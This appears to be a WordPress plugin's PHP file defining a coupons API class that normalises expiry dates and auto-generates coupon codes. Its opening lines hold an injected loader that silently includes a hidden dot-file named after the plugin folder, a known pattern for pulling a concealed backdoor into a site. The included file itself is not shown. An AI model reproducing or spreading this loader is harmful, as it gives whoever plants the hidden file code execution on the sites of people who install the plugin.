<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpdtCouponsApi extends MpdtBaseApi {
  /**
   *  @param $args This is the data that was passed in the request
   */
  protected function before_create($args, $request) {
    if( isset($args['should_expire']) && $args['should_expire'] &&
        isset($args['expires_on']) && !empty($args['expires_on']) &&
        !is_numeric($args['expires_on']) ) {
      $request->set_param('expires_on', strtotime($args['expires_on']));
    }

    if(!isset($args['coupon_code']) || empty($args['coupon_code'])) {
      $request->set_param('coupon_code', strtoupper(uniqid()));
    }

    return $request;
  }
}

